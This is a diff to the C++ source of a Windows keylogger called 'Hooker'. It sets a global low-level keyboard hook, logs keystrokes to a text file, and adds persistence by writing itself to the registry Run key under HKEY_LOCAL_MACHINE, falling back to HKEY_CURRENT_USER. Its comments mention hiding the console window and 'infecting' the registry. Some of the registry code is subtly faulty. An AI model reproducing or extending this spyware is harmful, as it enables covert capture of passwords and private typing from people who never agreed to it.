@@ -1,10 +1,11 @@
 
-#include<Windows.h>
 #include "HookerHead.h"
-#pragma comment(lib,"user32.lib")
+
 using namespace std;
 string str = "";
+LSTATUS registryAddingStatus;
 const string logFileName = "HookerLogs.txt";
+LPCSTR hookerRegistryName = "Hooker";
 static bool capsLockPressed = false;
 static bool isShiftPress = false;
 ofstream outStream;
@@ -18,9 +19,19 @@ int main(){
 	//Hide the console window and make it run at background 
 	//If you execute the .exe file stop the process manualy
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	bool isRegisterAdded = CheckIfRegistryKeyExist(hookerRegistryName); // Do not add new record in the registers
+	if (!isRegisterAdded) {
+		//Try to add new key in register in the HKEY_LOCAL_MACHINE - it will apply
+		//the changes globaly for all users using this PC.
+		//Need administrative pri Administrative privileges
+		AddProgramInHKEY_LOCAL_MACHINERegister(registryAddingStatus);
+		if (registryAddingStatus != ERROR_SUCCESS) { // ERROR_SUCCESS is returned if the adding was successful
+															 //the adding key in HKEY_LOCAL_MACHINE is failed, moutly due to not Administrative privileges
+			AddProgramInHKEY_CURRENT_USER(registryAddingStatus);		
+		}
+		cout << registryAddingStatus << endl;
+	}
 	
-	AddProgramInHKEY_LOCAL_MACHINERegister();
-	//Open the file stream 
 	//Define the keyboard hook
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
 	if (hHook == NULL) {
@@ -113,17 +124,33 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 		break;
 	}
 }
+bool CheckIfRegistryKeyExist(const LPCSTR &keyName) {
+	HKEY hKey = NULL;
+	LONG result = RegQueryValueEx(hKey, keyName, NULL, NULL, NULL,NULL);
+	if (result == ERROR_SUCCESS) {
+		return true;
+	}
+	return false;
+}
 //Administrative access is required in order to execute this fuction
 //If the current logged user is Administrator this will add the Hooker.exe
 //in the registers, so the logger will star on reboot
 //If this is successfull then the Hooker.exe will need only one manual start form the user
 //then he will infect the windows registers
-void AddProgramInHKEY_LOCAL_MACHINERegister() {
+void AddProgramInHKEY_LOCAL_MACHINERegister(LSTATUS &status) {
 	TCHAR szPath[MAX_PATH];
 	GetModuleFileName(NULL, szPath, MAX_PATH);
-	HKEY newValue;
-	RegOpenKey(newValue, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue); 
+	HKEY hKey;
+	LSTATUS s = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_PATH, 0, NULL, &hKey);
 	//To delete this you need to go in the register and manualy delete the Hooker key
-	RegSetValueEx(newValue, "Hoocker", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
-	LSTATUS st = RegCloseKey(newValue); // Need to be fixed!
+	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
+    RegCloseKey(hKey);
+}
+void AddProgramInHKEY_CURRENT_USER(LSTATUS &status) {
+	TCHAR szPath[MAX_PATH];
+	GetModuleFileName(NULL, szPath, MAX_PATH);
+	HKEY hKey;
+	LSTATUS s = RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, &hKey);
+	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, 0);
+	RegCloseKey(hKey);
 }
